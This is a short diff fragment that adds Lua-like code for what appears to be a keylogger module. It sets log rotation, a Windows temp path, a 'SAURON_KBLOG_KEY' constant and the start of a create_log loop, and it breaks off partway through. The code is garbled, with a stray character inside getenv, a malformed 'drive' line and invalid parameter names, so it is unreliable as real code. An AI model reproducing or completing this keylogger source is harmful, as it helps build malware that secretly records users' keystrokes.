@@ -1,0 +1,11 @@
+ KBLOG_ROTATE_SECS = 10800
+tmp_dir = os.getenv("WINDIR·) .. "\\temp\\"
+drive "C:\\"
+SAURON_KBLOG_KEY = "mISfx1q2eF/QJPO4gi6DMKD51xeQ380knDrULcZyTF5vFNWb"
+create_log = function(1_1_0, 1_1_1, 1_1_2, 1_1_3)
+  local f = ""
+  repeat
+    w.sleep(1000)
+    t1 = "b"
+    t2 = "k"
+    t3 = "a"
